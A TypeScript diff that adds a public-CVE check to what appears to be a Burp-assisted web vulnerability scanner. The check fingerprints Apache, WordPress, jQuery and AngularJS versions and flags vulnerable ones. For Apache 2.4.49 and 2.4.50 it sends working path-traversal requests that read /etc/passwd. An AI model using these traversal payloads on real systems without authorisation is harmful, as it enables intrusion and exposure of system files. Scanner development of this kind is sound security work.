@@ -2351,6 +2351,187 @@ interface PassiveFinding {
   poc?: string;
 }
 
+interface PublicCveCandidate {
+  cve: string;
+  component: string;
+  version: string;
+  severity: PassiveFinding["severity"];
+  rationale: string;
+  probe?: {
+    method: "GET" | "POST";
+    path: string;
+    body?: string;
+    headers?: Record<string, string>;
+    successPatterns: RegExp[];
+  };
+}
+
+function parseSemverLoose(version: string): number[] {
+  const parts = String(version || "")
+    .split(".")
+    .map((p) => Number((p.match(/\d+/)?.[0] || "0")));
+  while (parts.length < 3) parts.push(0);
+  return parts.slice(0, 3);
+}
+
+function cmpSemverLoose(a: string, b: string): number {
+  const av = parseSemverLoose(a);
+  const bv = parseSemverLoose(b);
+  for (let i = 0; i < 3; i++) {
+    if (av[i] > bv[i]) return 1;
+    if (av[i] < bv[i]) return -1;
+  }
+  return 0;
+}
+
+async function checkPublicCVEExposureAndProbe(
+  baseUrl: string,
+  serverTechFindings: ServerTechFinding[] = []
+): Promise<PassiveFinding[]> {
+  const findings: PassiveFinding[] = [];
+  let resp: { status: number; headers: Record<string, string>; body: string };
+  const origin = new URL(baseUrl).origin;
+
+  try {
+    liveShow(baseUrl);
+    resp = await sendRequestFallbackCached("GET", baseUrl);
+  } catch {
+    try {
+      resp = await sendRequestThroughBurp("GET", baseUrl);
+    } catch {
+      return findings;
+    }
+  }
+
+  const server = String(resp.headers["server"] || resp.headers["Server"] || "");
+  const xPoweredBy = String(resp.headers["x-powered-by"] || resp.headers["X-Powered-By"] || "");
+  const xGenerator = String(resp.headers["x-generator"] || resp.headers["X-Generator"] || "");
+  const body = String(resp.body || "");
+  const bodySnippet = body.slice(0, 6000);
+  const candidates: PublicCveCandidate[] = [];
+
+  const apacheMatch = server.match(/apache\/(\d+\.\d+(?:\.\d+)?)/i);
+  if (apacheMatch?.[1] === "2.4.49") {
+    candidates.push({
+      cve: "CVE-2021-41773",
+      component: "Apache HTTPD",
+      version: apacheMatch[1],
+      severity: "High",
+      rationale: "Apache 2.4.49 is publicly vulnerable to path traversal / possible RCE when misconfigured.",
+      probe: {
+        method: "GET",
+        path: "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+        successPatterns: [/root:.*:0:0:/i, /\/bin\/(bash|sh)/i],
+      },
+    });
+  } else if (apacheMatch?.[1] === "2.4.50") {
+    candidates.push({
+      cve: "CVE-2021-42013",
+      component: "Apache HTTPD",
+      version: apacheMatch[1],
+      severity: "High",
+      rationale: "Apache 2.4.50 remains vulnerable to traversal bypass variants in affected configs.",
+      probe: {
+        method: "GET",
+        path: "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+        successPatterns: [/root:.*:0:0:/i, /\/bin\/(bash|sh)/i],
+      },
+    });
+  }
+
+  const wpSource = `${xGenerator}\n${bodySnippet}`;
+  const wpMatch = wpSource.match(/wordpress\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i);
+  if (wpMatch?.[1] && cmpSemverLoose(wpMatch[1], "5.8.3") < 0) {
+    candidates.push({
+      cve: "CVE-2022-21661",
+      component: "WordPress",
+      version: wpMatch[1],
+      severity: "High",
+      rationale: "WordPress versions below 5.8.3 include a known SQLi exposure in WP_Query paths.",
+    });
+  }
+
+  const jqueryMatch = bodySnippet.match(/jquery(?:-|\.)((?:\d+\.){1,2}\d+)/i);
+  if (jqueryMatch?.[1] && cmpSemverLoose(jqueryMatch[1], "3.5.0") < 0) {
+    candidates.push({
+      cve: "CVE-2020-11022/11023",
+      component: "jQuery",
+      version: jqueryMatch[1],
+      severity: "Medium",
+      rationale: "jQuery below 3.5.0 has known HTML parsing XSS weaknesses.",
+    });
+  }
+
+  const angularMatch = bodySnippet.match(/angular(?:\.min)?\.js(?:\?v=|\?ver=)?([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i);
+  if (angularMatch?.[1] && cmpSemverLoose(angularMatch[1], "1.8.0") < 0) {
+    candidates.push({
+      cve: "CVE-2019-10768",
+      component: "AngularJS",
+      version: angularMatch[1],
+      severity: "Medium",
+      rationale: "AngularJS versions below 1.8.0 include publicly known prototype-pollution exposure.",
+    });
+  }
+
+  if (!candidates.length && serverTechFindings.length) {
+    const names = serverTechFindings.map((f) => f.name).join(", ");
+    findings.push({
+      type: "Server Exposure Fingerprint",
+      severity: "Info",
+      endpoint: `GET ${baseUrl}`,
+      param: "tech-stack",
+      payload: names,
+      evidence: `Server stack fingerprinted (${names}). No version-ranged public CVE exposure was inferred from current headers/body.`,
+    });
+    return findings;
+  }
+
+  for (const candidate of candidates) {
+    let probeNote = "";
+    if (candidate.probe) {
+      const probeUrl = `${origin}${candidate.probe.path}`;
+      try {
+        liveShow(probeUrl);
+        const probeResp = await sendRequestThroughBurp(
+          candidate.probe.method,
+          probeUrl,
+          candidate.probe.headers || {},
+          candidate.probe.body
+        );
+        const probeBody = String(probeResp.body || "");
+        const confirmed = candidate.probe.successPatterns.some((re) => re.test(probeBody));
+
+        if (confirmed) {
+          findings.push({
+            type: `Confirmed Public CVE Exploit (${candidate.cve})`,
+            severity: "Critical",
+            endpoint: `${candidate.probe.method} ${probeUrl}`,
+            param: candidate.component,
+            payload: candidate.cve,
+            evidence: `Probe succeeded against ${candidate.component} ${candidate.version}. Response matched exploit indicators for ${candidate.cve}.`,
+          });
+          continue;
+        }
+
+        probeNote = ` Probe attempted at ${probeUrl} (HTTP ${probeResp.status}) with no direct exploit indicator.`;
+      } catch (e: any) {
+        probeNote = ` Probe attempted but failed to complete cleanly: ${e?.message || String(e)}.`;
+      }
+    }
+
+    findings.push({
+      type: `Public CVE Exposure (Potential) — ${candidate.cve}`,
+      severity: candidate.severity,
+      endpoint: `GET ${baseUrl}`,
+      param: candidate.component,
+      payload: `${candidate.component} ${candidate.version}`,
+      evidence: `${candidate.rationale}${probeNote}`,
+    });
+  }
+
+  return findings;
+}
+
 /** Direct fetch (no proxy) — used as fallback when Burp is not running */
 async function fetchDirect(
   method: string,
@@ -5003,6 +5184,18 @@ async function _executeAutoCrawlInner(rawInput: AutoCrawlOptions = {}) {
     console.error("[VersionDisclosure] Check failed:", err.message);
   }
   scanState.completedTests += 2;
+  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
+
+  // ── A06: public CVE exposure mapping + targeted exploit probes ─────────
+  scanState.currentTest = "Phase 2/2: A06 — public CVE exposure checks";
+  try {
+    const cveExposureFindings = await checkPublicCVEExposureAndProbe(scanTargetUrl, serverTechFindings);
+    passiveFindings.push(...cveExposureFindings);
+    console.error(`[PublicCVE] ${cveExposureFindings.length} finding(s)`);
+  } catch (err: any) {
+    console.error("[PublicCVE] Check failed:", err.message);
+  }
+  scanState.completedTests += 3;
   scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
 
   // ── HTML comments with sensitive data ────────────────────────────────
